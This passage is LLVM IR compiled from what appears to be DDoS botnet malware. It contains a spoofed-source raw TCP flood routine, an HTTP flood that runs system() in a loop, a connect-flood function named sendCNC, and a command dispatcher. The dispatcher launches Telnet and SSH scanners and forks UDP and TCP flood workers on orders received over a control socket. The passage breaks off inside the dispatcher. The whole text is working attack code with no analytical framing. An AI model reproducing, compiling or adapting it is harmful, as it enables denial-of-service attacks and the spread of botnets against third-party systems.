  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %165

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %165

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %165

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i64 @time(i64* null) #3
  %138 = zext i32 %2 to i64
  %139 = add i64 %137, %138
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  %sext = shl i64 %139, 32
  %145 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %146 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #3
  %147 = call i32 @getRandomIP(i32 %.065)
  %148 = call i32 @htonl(i32 %147) #18
  store i32 %148, i32* %142, align 4
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %144, align 4
  %151 = call i32 @rand_cmwc()
  store i32 %151, i32* %59, align 8
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  store i16 %153, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %154 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %154, i16* %114, align 4
  %155 = load i16, i16* %131, align 2
  %156 = zext i16 %155 to i32
  %157 = call zeroext i16 @csum(i16* nonnull %129, i32 %156)
  store i16 %157, i16* %136, align 2
  %158 = icmp eq i32 %.0, %6
  br i1 %158, label %159, label %162

; <label>:159:                                    ; preds = %.backedge
  %160 = call i64 @time(i64* null) #3
  %161 = icmp sgt i64 %160, %145
  br i1 %161, label %164, label %.backedge.backedge

; <label>:162:                                    ; preds = %.backedge
  %163 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %162, %159
  %.0.be = phi i32 [ %163, %162 ], [ 0, %159 ]
  br label %.backedge

; <label>:164:                                    ; preds = %159
  call void @llvm.stackrestore(i8* %44)
  br label %165

; <label>:165:                                    ; preds = %18, %164, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #1 {
  %3 = alloca [80 x i8*], align 16
  %4 = tail call i64 @time(i64* null) #3
  %5 = zext i32 %1 to i64
  %6 = add i64 %4, %5
  %7 = tail call i32 @rand() #3
  %8 = sext i32 %7 to i64
  %9 = urem i64 %8, 23
  %10 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %9
  %11 = load i8*, i8** %10, align 8
  %12 = bitcast [80 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0), i64 13, i32 1, i1 false)
  %13 = call i8* @strcat(i8* nonnull %12, i8* %11) #3
  %strlen = call i64 @strlen(i8* nonnull %12)
  %endptr = getelementptr i8, i8* %12, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0), i64 6, i32 1, i1 false)
  %14 = call i8* @strcat(i8* nonnull %12, i8* %0) #3
  %sext = shl i64 %6, 32
  %15 = ashr exact i64 %sext, 32
  %16 = call i64 @time(i64* null) #3
  %17 = icmp sgt i64 %15, %16
  br i1 %17, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %18 = call i32 @rand() #3
  %19 = sext i32 %18 to i64
  %20 = urem i64 %19, 23
  %21 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %20
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0), i64 13, i32 1, i1 false)
  %23 = call i8* @strcat(i8* nonnull %12, i8* %22) #3
  %strlen5 = call i64 @strlen(i8* nonnull %12)
  %endptr6 = getelementptr i8, i8* %12, i64 %strlen5
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0), i64 6, i32 1, i1 false)
  %24 = call i8* @strcat(i8* nonnull %12, i8* %0) #3
  %25 = call i32 @system(i8* nonnull %12) #3
  %26 = call i64 @time(i64* null) #3
  %27 = icmp sgt i64 %15, %26
  br i1 %27, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i64 @time(i64* null) #3
  %6 = zext i32 %2 to i64
  %7 = add i64 %5, %6
  %8 = tail call i32 @inet_addr(i8* %0) #3
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %8, i32* %9, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = trunc i32 %1 to i16
  %12 = tail call zeroext i16 @htons(i16 zeroext %11) #18
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %sext = shl i64 %7, 32
  %14 = ashr exact i64 %sext, 32
  %15 = call i64 @time(i64* null) #3
  %16 = icmp sgt i64 %14, %15
  br i1 %16, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %17 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %18

; <label>:18:                                     ; preds = %.lr.ph, %18
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %20 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %17, i32 16) #3
  %21 = call i32 @sleep(i32 1) #3
  %22 = call i32 @close(i32 %19) #3
  %23 = call i64 @time(i64* null) #3
  %24 = icmp sgt i64 %14, %23
  br i1 %24, label %18, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %18
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i64 0, i64 0))
  br label %294

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i64 0, i64 0), i8* %15)
  br label %294

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %58

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i64 0, i64 0))
  br label %294

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %58

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %294, label %33

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i64 0, i64 0))
  %36 = load i32, i32* @scanPid, align 4
  %37 = tail call i32 @kill(i32 %36, i32 9) #3
  store i32 0, i32* @scanPid, align 4
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i64 0, i64 0)) #15
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %33
  %42 = tail call i32 @fork() #3
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %43, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i64 0, i64 0))
  %45 = icmp eq i32 %42, 0
  br i1 %45, label %47, label %46

; <label>:46:                                     ; preds = %41
  store i32 %42, i32* @scanPid, align 4
  br label %294

; <label>:47:                                     ; preds = %41
  tail call void @TelnetScanner() #3
  unreachable

; <label>:48:                                     ; preds = %33
  %49 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0)) #15
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %._crit_edge

._crit_edge:                                      ; preds = %48
  %.pre = load i8*, i8** %1, align 8
  br label %58

; <label>:51:                                     ; preds = %48
  %52 = tail call i32 @fork() #3
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i64 0, i64 0))
  %55 = icmp eq i32 %52, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %51
  store i32 %52, i32* @scanPid, align 4
  br label %294

; <label>:57:                                     ; preds = %51
  tail call void @SSHScanner() #3
  unreachable

; <label>:58:                                     ; preds = %._crit_edge, %25, %17
  %59 = phi i8* [ %.pre, %._crit_edge ], [ %3, %25 ], [ %3, %17 ]
  %60 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #15
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %.loopexit163

; <label>:62:                                     ; preds = %58
  %63 = icmp slt i32 %0, 6
  br i1 %63, label %294, label %64

; <label>:64:                                     ; preds = %62
  %65 = getelementptr inbounds i8*, i8** %1, i64 3
  %66 = load i8*, i8** %65, align 8
  %67 = tail call i32 @atoi(i8* %66) #15
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %294, label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds i8*, i8** %1, i64 2
  %71 = load i8*, i8** %70, align 8
  %72 = tail call i32 @atoi(i8* %71) #15
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %294, label %74

; <label>:74:                                     ; preds = %69
  %75 = getelementptr inbounds i8*, i8** %1, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = tail call i32 @atoi(i8* %76) #15
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %294, label %79

; <label>:79:                                     ; preds = %74
  %80 = getelementptr inbounds i8*, i8** %1, i64 5
  %81 = load i8*, i8** %80, align 8
  %82 = tail call i32 @atoi(i8* %81) #15
  %83 = icmp eq i32 %82, -1
  %84 = icmp sgt i32 %82, 65500
  %or.cond = or i1 %83, %84
  %85 = icmp sgt i32 %77, 32
  %or.cond146 = or i1 %85, %or.cond
  br i1 %or.cond146, label %294, label %86

; <label>:86:                                     ; preds = %79
  %87 = icmp eq i32 %0, 7
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %86
  %89 = getelementptr inbounds i8*, i8** %1, i64 6
  %90 = load i8*, i8** %89, align 8
  %91 = tail call i32 @atoi(i8* %90) #15
  %92 = icmp slt i32 %91, 1
  br i1 %92, label %294, label %93

; <label>:93:                                     ; preds = %88, %86
  %94 = getelementptr inbounds i8*, i8** %1, i64 1
  %95 = load i8*, i8** %94, align 8
  %96 = tail call i32 @atoi(i8* %71) #15
  %97 = tail call i32 @atoi(i8* %66) #15
  %98 = tail call i32 @atoi(i8* %76) #15
  %99 = tail call i32 @atoi(i8* %81) #15
  br i1 %87, label %100, label %104

; <label>:100:                                    ; preds = %93
  %101 = getelementptr inbounds i8*, i8** %1, i64 6
  %102 = load i8*, i8** %101, align 8
  %103 = tail call i32 @atoi(i8* %102) #15
  br label %104

; <label>:104:                                    ; preds = %93, %100
  %105 = phi i32 [ %103, %100 ], [ 10, %93 ]
  %strchr = tail call i8* @strchr(i8* %95, i32 44)
  %106 = icmp eq i8* %strchr, null
  br i1 %106, label %113, label %.preheader162.preheader

.preheader162.preheader:                          ; preds = %104
  br label %.preheader162

.preheader162:                                    ; preds = %.preheader162.preheader, %109
  %.sink = phi i8* [ null, %109 ], [ %95, %.preheader162.preheader ]
  %107 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %108 = icmp eq i8* %107, null
  br i1 %108, label %.loopexit163.loopexit, label %109

; <label>:109:                                    ; preds = %.preheader162
  %110 = tail call i32 @listFork()
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %.preheader162

; <label>:112:                                    ; preds = %109
  tail call void @sendUDP(i8* nonnull %107, i32 %96, i32 %97, i32 %98, i32 %99, i32 %105)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:113:                                    ; preds = %104
  %114 = tail call i32 @listFork()
  %115 = icmp eq i32 %114, 0
  br i1 %115, label %116, label %294

; <label>:116:                                    ; preds = %113
  tail call void @sendUDP(i8* %95, i32 %96, i32 %97, i32 %98, i32 %99, i32 %105)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit163.loopexit:                            ; preds = %.preheader162
  %.pre178 = load i8*, i8** %1, align 8
  br label %.loopexit163

.loopexit163:                                     ; preds = %.loopexit163.loopexit, %58
  %117 = phi i8* [ %.pre178, %.loopexit163.loopexit ], [ %59, %58 ]
  %118 = tail call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i64 0, i64 0)) #15
  %119 = icmp eq i32 %118, 0
  br i1 %119, label %120, label %.loopexit161

; <label>:120:                                    ; preds = %.loopexit163
  %121 = icmp slt i32 %0, 6
  br i1 %121, label %294, label %122

; <label>:122:                                    ; preds = %120
  %123 = getelementptr inbounds i8*, i8** %1, i64 3
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #15
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %294, label %127

; <label>:127:                                    ; preds = %122
  %128 = getelementptr inbounds i8*, i8** %1, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #15
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %294, label %132

; <label>:132:                                    ; preds = %127
  %133 = getelementptr inbounds i8*, i8** %1, i64 4
  %134 = load i8*, i8** %133, align 8
  %135 = tail call i32 @atoi(i8* %134) #15
  %136 = icmp eq i32 %135, -1
  %137 = icmp sgt i32 %135, 32
  %or.cond147 = or i1 %136, %137
  br i1 %or.cond147, label %294, label %138

; <label>:138:                                    ; preds = %132
  %139 = icmp sgt i32 %0, 6
  br i1 %139, label %140, label %.thread

; <label>:140:                                    ; preds = %138
  %141 = getelementptr inbounds i8*, i8** %1, i64 6
  %142 = load i8*, i8** %141, align 8
  %143 = tail call i32 @atoi(i8* %142) #15
  %144 = icmp slt i32 %143, 0
  br i1 %144, label %294, label %145

; <label>:145:                                    ; preds = %140
  %146 = icmp eq i32 %0, 8
  br i1 %146, label %147, label %.thread

; <label>:147:                                    ; preds = %145
  %148 = getelementptr inbounds i8*, i8** %1, i64 7
  %149 = load i8*, i8** %148, align 8
  %150 = tail call i32 @atoi(i8* %149) #15
  %151 = icmp slt i32 %150, 1
  br i1 %151, label %294, label %.thread

.thread:                                          ; preds = %138, %147, %145
  %152 = phi i1 [ true, %147 ], [ false, %145 ], [ false, %138 ]
  %153 = getelementptr inbounds i8*, i8** %1, i64 1
  %154 = load i8*, i8** %153, align 8
  %155 = tail call i32 @atoi(i8* %129) #15
  %156 = tail call i32 @atoi(i8* %124) #15
  %157 = tail call i32 @atoi(i8* %134) #15
  %158 = getelementptr inbounds i8*, i8** %1, i64 5
  %159 = load i8*, i8** %158, align 8
  br i1 %152, label %160, label %164

; <label>:160:                                    ; preds = %.thread
  %161 = getelementptr inbounds i8*, i8** %1, i64 7
  %162 = load i8*, i8** %161, align 8
  %163 = tail call i32 @atoi(i8* %162) #15
  br label %164

; <label>:164:                                    ; preds = %.thread, %160
  %165 = phi i32 [ %163, %160 ], [ 10, %.thread ]
  br i1 %139, label %166, label %170

; <label>:166:                                    ; preds = %164
  %167 = getelementptr inbounds i8*, i8** %1, i64 6
  %168 = load i8*, i8** %167, align 8
  %169 = tail call i32 @atoi(i8* %168) #15
  br label %170

; <label>:170:                                    ; preds = %164, %166
  %171 = phi i32 [ %169, %166 ], [ 0, %164 ]
  %strchr142 = tail call i8* @strchr(i8* %154, i32 44)
  %172 = icmp eq i8* %strchr142, null
  br i1 %172, label %179, label %.preheader160.preheader

.preheader160.preheader:                          ; preds = %170
  br label %.preheader160

.preheader160:                                    ; preds = %.preheader160.preheader, %175
  %.sink148 = phi i8* [ null, %175 ], [ %154, %.preheader160.preheader ]
  %173 = tail call i8* @strtok(i8* %.sink148, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %174 = icmp eq i8* %173, null
  br i1 %174, label %.loopexit161.loopexit, label %175

; <label>:175:                                    ; preds = %.preheader160
  %176 = tail call i32 @listFork()
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %.preheader160

; <label>:178:                                    ; preds = %175
  tail call void @sendTCP(i8* nonnull %173, i32 %155, i32 %156, i32 %157, i8* %159, i32 %171, i32 %165)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:179:                                    ; preds = %170
  %180 = tail call i32 @listFork()
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %294

; <label>:182:                                    ; preds = %179
  tail call void @sendTCP(i8* %154, i32 %155, i32 %156, i32 %157, i8* %159, i32 %171, i32 %165)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit161.loopexit:                            ; preds = %.preheader160
  %.pre179 = load i8*, i8** %1, align 8
  br label %.loopexit161

.loopexit161:                                     ; preds = %.loopexit161.loopexit, %.loopexit163
  %183 = phi i8* [ %.pre179, %.loopexit161.loopexit ], [ %117, %.loopexit163 ]
  %184 = tail call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0)) #15
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %186, label %.loopexit159

; <label>:186:                                    ; preds = %.loopexit161
  %187 = icmp slt i32 %0, 3
  br i1 %187, label %294, label %188

; <label>:188:                                    ; preds = %186
  %189 = getelementptr inbounds i8*, i8** %1, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = tail call i32 @atoi(i8* %190) #15
  %192 = icmp slt i32 %191, 1
  br i1 %192, label %294, label %193

; <label>:193:                                    ; preds = %188
  %194 = getelementptr inbounds i8*, i8** %1, i64 1
  %195 = load i8*, i8** %194, align 8
  %strchr143 = tail call i8* @strchr(i8* %195, i32 44)
  %196 = icmp eq i8* %strchr143, null
  br i1 %196, label %204, label %.preheader158.preheader

.preheader158.preheader:                          ; preds = %193
  br label %.preheader158

.preheader158:                                    ; preds = %.preheader158.preheader, %199
  %.sink149 = phi i8* [ null, %199 ], [ %195, %.preheader158.preheader ]
  %197 = tail call i8* @strtok(i8* %.sink149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
